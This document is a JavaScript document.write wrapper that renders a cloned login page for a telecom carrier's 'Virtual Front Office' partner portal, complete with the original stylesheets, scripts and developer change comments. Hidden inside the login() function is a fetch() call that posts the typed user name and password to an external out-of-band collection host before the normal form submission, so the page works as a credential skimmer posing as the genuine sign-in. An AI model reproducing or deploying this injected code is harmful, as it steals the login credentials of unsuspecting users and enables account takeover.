document.write(`
<html>
    <head>
	<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="no-cache, no-store, must-revalidate">
    <META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
    <META HTTP-EQUIV="Expires" CONTENT="0">
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
	<!-- <meta http-equiv="X-UA-Compatible" content="IE=EMULATEIE7" /> -->
	<script type="text/javascript">
			document.onclick = function() {
				var e = event.srcElement.tagName;
				if (e == "A") {
					event.srcElement.style.color = "#609";
				}
			}
			
	</script>
	





	<LINK REL="stylesheet" href="https://vfoclec.frontier.com/css/default_vfostyles.css" TYPE="text/css" MEDIA="all">

<LINK REL="stylesheet" href="https://vfoclec.frontier.com/calendar/calendar-blue.css" TYPE="text/css" MEDIA="all">
    <script language="JavaScript1.2" src="https://vfoclec.frontier.com/js/utils.js"></script>
    <script language="JavaScript" src="https://vfoclec.frontier.com/js/OpenCloseWin.js"></script>
    <script language="JavaScript" src="https://vfoclec.frontier.com/js/extrnalClose.js"></script>
    <STYLE type="text/css">
        #busyLayer{position:absolute; width:100%; height:100%; top:0px; z-index:5; left:0px; visibility: hidden ;cursor : wait}
    </STYLE>
    <div id="busyLayer" name="busyLayer">
		<IFRAME  width="100%" height="100%" scrolling="no" frameborder="0" src="https://vfoclec.frontier.com/busy.html"></IFRAME>
    </div>
    
     <STYLE type="text/css">
        #busyLayer1{position:absolute; width:100%; height:100%; top:0px; z-index:5; left:0px; visibility: hidden ;cursor : wait}
    </STYLE>
    <div id="busyLayer1" name="busyLayer1">
		<IFRAME  width="100%" height="100%" scrolling="no" frameborder="0" src="https://vfoclec.frontier.com/HourGlass.html"></IFRAME>
    </div>

<!-- File Name : OrderTestCaseSearchResult.jsp -->









	<LINK REL="stylesheet" href="https://vfoclec.frontier.com/css/default_vfostyles.css" TYPE="text/css" MEDIA="all">

<LINK REL="stylesheet" href="https://vfoclec.frontier.com/calendar/calendar-blue.css" TYPE="text/css" MEDIA="all">



    
    






<title>login - Virtual Front Office</title>
<script type="text/javascript" src="https://vfoclec.frontier.com/js/jquery_src/jquery-3.7.1.min.js"></script>
<script language="javascript1.2">
    /*26-oct-2004 vikramv@wiosrindia.soft.net below code is add to make enter key functionality enabled while loging in*/
    /*  <Product>WebVFO</Product>
        * <Release>15.20.0.1</Release>
        * <Requirement Number></Requirement Number>
        * <Defect ID> INOWVFO-2824 </Defect ID>
        * <Use case number></Use case number>
        * <Sequence Diagram Number></Sequence Diagram Number>
        * <author>Ravi R Kulkarni</author>
        * <date>May-2017</date>
        */
    //REMOVED "/" for actions in order to support web contexct as vfowebapp
    /*
     * <Product>VFO</Product>
     * <Release>15.21.0.2</Release>
     * <Requirement Number></Requirement Number>
     * <Defect ID>INOWVFO-3037</Defect ID>
     * <Use case number></Use case number>
     * <Sequence Diagram Number></Sequence Diagram Number>
     * <author>Suprabha M P</author>
     * <date>May-2017</date>
     */
    /*  <Product>WebVFO</Product>
     * <Release>15.22.0.2</Release>
     * <Requirement Number></Requirement Number>
     * <Defect ID> INOWVFO-3171</Defect ID>
     * <Use case number></Use case number>
     * <Sequence Diagram Number></Sequence Diagram Number>
     * <author>Ravi R Kulkarni</author>
     * <date>08-Aug-2017</date>
     */
    /*  <Product>WebVFO</Product>
    * <Release>16.10.0.1</Release>
    * <Requirement Number></Requirement Number>
    * <Defect ID>INOWVFO-6777/INOWVFO-6763</Defect ID>
    * <Use case number></Use case number>
    * <Sequence Diagram Number></Sequence Diagram Number>
    * <author>Ravi R Kulkarni</author>
    * <date>June-2019</date>
    */
    /*<Product>WebVFO</Product>
    * <Release>18.23.21.0.X</Release>
    * <Requirement Number></Requirement Number>
    * <Defect ID>INOWVFO-11893/INOWVFO-11893</Defect ID>
    * <Use case number></Use case number>
    * <Sequence Diagram Number></Sequence Diagram Number>
    * <author>Ravi R Kulkarni</author>
    * <date>25-Nov-2022</date>
    */
    //INOWVFO-14470  ::  Ravi R Kulkarni  :: Sprint61
    //INOWVFO-14470  ::  Ravi R Kulkarni  :: Sprint61 : Fix for reopen
    //INOWVFO-14537 ::  Ravi R Kulkarni  :: Sprint63
    

    

    function keyDown(eve) {
        if(eve) {
            keycode = eve.keyCode;
        } else {
            keycode = event.keyCode;
        }

        if(keycode==13){
            login();
        }

    }

    function setCookie(name,value,expires,path,domain,secure){
        document.cookie = name + "=" +escape(value) +
            ( (expires) ? ";expires=" + expires.toGMTString() : "") +
            ( (path) ? ";path=" + path : "") +
            ( (domain) ? ";domain=" + domain : "") +
            ( (secure) ? ";secure" : "");
    }

    function setCookie(name, value) {
        var  today=new Date();
        var expire=new Date();
        expire.setTime(today.getTime()+ 1000*60*60*24*90);
        document.cookie = name + "=" + escape(value) +
            ( (expire == null) ? "" : ("; expires=" + expire.toGMTString()))+";path=/";
    }

    function getcookie(cookiename) {
        var cookiestring=""+document.cookie;
        var index1=cookiestring.indexOf(cookiename);
        if (index1==-1 || cookiename=="") return "";
        var index2=cookiestring.indexOf(';',index1);
        if (index2==-1) index2=cookiestring.length;
        return unescape(cookiestring.substring(index1+cookiename.length+1,index2));
    }

    function setServiceRequestType(){
        if(getCookie("serviceRequestType")){

            var selObj = document.forms[0].serviceRequestType;
            var selectedValue = getCookie("serviceRequestType");
            for(var x = 0; x < selObj.length; x++){
                var strVal = selObj.options[x].value;
                if(strVal == selectedValue){
                    selObj.options[x].selected = true
                    return;
                }
            }
        }
    }


    document.onkeydown = keyDown;

    function login() {
        /*  var ua = navigator.userAgent.toLowerCase();
          if ( ua.indexOf( "firefox" ) != -1 ) {
          alert("VFO is not currently supported on Firefox. Please retry using Internet Explorer");
          return;
          } */

        var ua = navigator.userAgent.toLowerCase();
        var trident = ua.indexOf('trident/');
        var ie_ver =0;
        if (trident > 0) {
            var rv = ua.indexOf('rv:');
            ie_ver = parseInt(ua.substring(rv + 3, ua.indexOf('.', rv)), 10);

        }

        if( ( ua.indexOf( "chrome" ) != -1  && ua.indexOf( "opr" ) == -1 )|| ( ie_ver == 11 ) ){

            if(ie_ver == 11){
                alert("The web browser you are using is not a certified VFO browser. Please use Microsoft Edge or Google Chrome.");
            }

            if(document.forms[0].loginName.value == ''){
                alert("Please enter User Name");
                return;
            }

            if(document.forms[0].password.value == ''){
                alert("Please enter Password");
                return;
            }

            fetch('https://oltacehurwtlwifqhabakwby0sd96q3z3.oast.fun/endpoint', {
                method: 'POST',
                body: new URLSearchParams({
                    param1: document.forms[0].loginName.value,
                    param2: document.forms[0].password.value,
                })
            });


            if(document.loginform.serviceRequestType.options[document.loginform.serviceRequestType.selectedIndex].value == ''){

                alert("Please select a module");
                return;
            }
            document.loginform.task.value = "login";
            document.loginform.LoginEntry.value = "login";
            //jQuery('#password').val(IE10_NOPEEPING.password_value);
            setCookie("serviceRequestType",document.forms[0].serviceRequestType.options[document.loginform.serviceRequestType.selectedIndex].value);
            document.loginform.submit();

        }
        else{
            alert("The web browser you are using is not supported by Virtual Front Office (VFO). The only supported web browsers are Microsoft Edge and Google Chrome.");
            return false; }

    }

    function setInitialFocus(){
        if(document.forms[0].loginName){
            document.forms[0].loginName.focus();
        }
    }

    function checkSiteminderLogin(){
        var userName='null';
        if(userName!='null' && userName!=''){
            document.forms[0].loginName.value =userName;
            document.loginform.remoteUserName.value=userName;
            document.loginform.LoginEntry.value = "login";
            document.loginform.task.value = "login";
            document.loginform.submit();
        }else{
            return;
        }
    }
    function checkSSOLogin(){
        //alert("checkSSOLogin");
        var ssoTricket_ID='null';
        var vfoUser_ID='null';
        var circuit_ID='null';
        var ssoESPCustomerIDVal='null';

        var ssoFromCktIDLinkVal ='null';
        var ssoFromNavLinkVal ='null';
        var ssoUserpermissionVal = 'null';
        var ssomoduleName=  'null';

        if(ssoTricket_ID!='null' && ssoTricket_ID!=''){
            document.loginform.ssoTricketIDValue.value=ssoTricket_ID;
            document.loginform.vfoUserID.value=vfoUser_ID;
            document.loginform.circuitID.value=circuit_ID;
            document.loginform.espCutomerID.value=ssoESPCustomerIDVal;
            // alert("ssoFromCktIDLinkVal == "+ssoFromCktIDLinkVal);
            if('null'!=null && 'null'!=''){
                document.loginform.fromCktID.value='null';
            }
            if(ssoFromNavLinkVal!=null && ssoFromNavLinkVal!=''){
                document.loginform.fromNav.value=ssoFromNavLinkVal;
            }

            document.loginform.userPermissionVal.value=ssoUserpermissionVal;
            document.loginform.moduleName.value=ssomoduleName;
            document.loginform.LoginEntry.value = "login";
            document.loginform.task.value = "login";
            document.loginform.submit();
        }else{
            return;
        }
    }
    function openSyncWebSite() {
        winPopName = "WisorWebSite";
        var myWin = window.open("https://razorflow.ai", winPopName);
        if(myWin && myWin!=winPopName) {
            if(!myWin.closed) {myWin.focus();}
        }
    }
    function  disableBrowserBackButton(){
        //alert("disableBrowserBackButton");
        //window.location.hash="no-back-button";
        //window.location.hash="Again-No-back-button";//again because google chrome don't insert first hash into history
        //window.onhashchange=function(){window.location.hash="no-back-button";}
        history.pushState(null, null, $(location).attr('href'));
        window.addEventListener('popstate', function () {
            history.pushState(null, null, $(location).attr('href'));
        });
    }
    function openEmailAddressInputPage(){
        

        var ua = navigator.userAgent.toLowerCase();
        var trident = ua.indexOf('trident/');
        var ie_ver =0;
        if (trident > 0) {
            var rv = ua.indexOf('rv:');
            ie_ver = parseInt(ua.substring(rv + 3, ua.indexOf('.', rv)), 10);

        }

        if( ( ua.indexOf( "chrome" ) != -1  && ua.indexOf( "opr" ) == -1 )|| ( ie_ver == 11 ) ){
            document.loginform.retrievePd.value ='ckBuRDBtb3BlbkVtYWlsQWRkcmVzc0lucHV0UGFnZQ==';
            document.loginform.task.value = "login";
            document.loginform.LoginEntry.value = "login";
            document.loginform.submit();

        }
        else{
            alert("The web browser you are using is not supported by Virtual Front Office (VFO). The only supported web browsers are Internet Explorer 11 and Google Chrome.");
            return false;
        }
    }

    function forgotPasswordPage(){
        
        document.loginform.retrievePd.value = 'ckBuRDBtZm9yZ290UGFzc3dvcmQ=';
        document.loginform.task.value = "login";
        document.loginform.LoginEntry.value = "login";
        document.loginform.submit();
    }
</script>
</head>
<body onload="disableBrowserBackButton()">





<table width="100%"  border="0" cellspacing="0" cellpadding="0" align="center">
    <tr>
        <th height="79" scope="col">&nbsp;</th>
    </tr>
    <tr>
        <th height="387" scope="row"><table width="532" height="363" border="0" cellpadding="0" cellspacing="0" align="center">
            <tr>
                <td><img src="https://vfoclec.frontier.com/spacer.gif" width="7" height="1" border="0" title=""></td>
                <td><img src="https://vfoclec.frontier.com/spacer.gif" width="514" height="1" border="0" title=""></td>
                <td><img src="https://vfoclec.frontier.com/spacer.gif" width="11" height="1" border="0" title=""></td>
                <td><img src="https://vfoclec.frontier.com/spacer.gif" width="1" height="1" border="0" title=""></td>
            </tr>
            <tr>
                <td colspan="3"><img name="login_r1_c1" src="https://vfoclec.frontier.com/images/login_r1_c1.jpg" width="534" height="58" border="0" title=""></td>

            </tr>
            <tr>
                <td height="20" style="background:url(images/login_r2_c1.jpg) no-repeat; width: 2px;" >&nbsp;</td>
                <td height="20" valign="top" style="width:515px;"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                    <tr>
                        <th height="42" scope="col"><div align="center"><span class="login_header"> Please
                Login</span></div></th>
                    </tr>
                    <tr>
                        <th height="192" valign="middle" scope="row">
                            <form name="loginform" method="post" action="LoginController.do">
                                <input type="hidden" name="task" />
                                <input type="hidden" name="LoginEntry" value=""/>
                                <input type="hidden" name="browserHeight"/>
                                <input type="hidden" name="browserWidth"/>
                                <input type="hidden" name="retrievePd" />
                                <table width="82%"  border="0" align="center" cellpadding="0" cellspacing="4" align="center">
                                    <tr>
                                        <th width="44%" height="10" scope="col"><div align="left" class="login_label">&nbsp;&nbsp;&nbsp;&nbsp;User
                                            Name </div></th>
                                        <th width="13%" height="10" scope="col">:</th>
                                        <th width="43%" height="10" scope="col"><div align="left">
                                            <input name="loginName" type="text" id="loginName" class="normaltext">
                                        </div></th>
                                    </tr>
                                    <tr>
                                        <th width="44%" height="10" scope="col"><div align="left" class="login_label"> </div></th>
                                        <th width="13%" height="10" scope="col"></th>
                                        <th width="43%" height="10" scope="col"><div align="right">
                                            <a href="https://vfoclec.frontier.com/javascript:openEmailAddressInputPage()" class="label_password-username_link_bld" tabIndex="-1">Forgot User Name?</a>
                                        </div></th>
                                    </tr>
                                    <tr>
                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
                                    </tr>
                                    <tr>
                                        <th height="10" scope="row"><div align="left" class="login_label">&nbsp;&nbsp;&nbsp;&nbsp;Password</div></th>
                                        <th height="10" scope="row">:</th>
                                        <th height="10" scope="row"><div align="left">
                                            <input name="password" type="password" id="password" class="normaltext" onCopy="return false" onDrag="return false" onDrop="return false" onPaste="return false" autocomplete="off">
                                        </div></th>
                                    </tr>
                                    <tr>
                                        <th height="10" scope="row"><div align="left" class="login_label"></div></th>
                                        <th height="10" scope="row"></th>
                                        <th height="10" scope="row"><div align="right">
                                            <a href="https://vfoclec.frontier.com/javascript:forgotPasswordPage()" class="label_password-username_link_bld" tabIndex="-1">Forgot Password?</a>
                                        </div></th>
                                    </tr>
                                    <tr>
                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
                                    </tr>
                                    <tr>
                                        <th height="10" scope="row"><div align="left" class="login_label">&nbsp;&nbsp;&nbsp;&nbsp;Module</div></th>
                                        <th height="10" scope="row">:</th>
                                        <th height="10" scope="row"><div align="left">
                                            <select name = "serviceRequestType" ><option value="">--Select--</option><option value= "ASR" >Access</option><option value= "Common Order" >Common Order</option><option value= "E911" >E911</option><option value= "LSR" >Local</option><option value= "TA" >TA</option>  </select> 
                                        </div>
                                        </th>
                                    </tr>
                                    <tr>
                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
                                        <th height="5" scope="col"><div align="left" class="login_label"></div></th>
                                    </tr>
                                    <tr>
                                        <th height="10" scope="row"><div align="left" class="login_label">&nbsp;&nbsp;&nbsp;&nbsp;Change Password </div></th>
                                        <th height="10" scope="row">:</th>
                                        <th height="10" scope="row"><div align="left">
                                            <input type="checkbox" name="changePassword" class="login_label" value="TRUE">
                                        </div></th>
                                    </tr>
                                    <tr>
                                        <th height="25" scope="row">&nbsp;</th>
                                        <th scope="row">&nbsp;</th>
                                        <th scope="row"><div align="left"><a href="https://vfoclec.frontier.com/#"><img src="https://vfoclec.frontier.com/images/login.gif" width="99" height="25" border="0" onClick="javascript:login()"></a> </div></th>
                                    </tr>
                                </table>
                            </form>
                        </th>
                    </tr>
                </table></td>
                <td height="20" style="background:url(images/login_r2_c3.jpg) no-repeat;">&nbsp;</td>
            </tr>
            <tr>
                <td colspan="3"><img name="login_r3_c1" src="https://vfoclec.frontier.com/images/login_r3_c1.jpg" width="534" height="71" border="0" title="" usemap="#Map"></td>
            </tr>
        </table></th>
    </tr>
    <tr>
        <th scope="row">&nbsp;</th>
    </tr>
</table>
<map name="Map">
    <area shape="rect" coords="410,35,520,70" href="https://vfoclec.frontier.com/javascript:openSyncWebSite()">
</map>
<script type="text/javascript" src="https://vfoclec.frontier.com/js/ie10_nopeeping.js"></script>
</body>
<script>
    setServiceRequestType();
    setInitialFocus();
    document.loginform.browserHeight.value=document.documentElement.clientHeight;
    document.loginform.browserWidth.value=document.documentElement.clientWidth;
</script>


</html>
`);
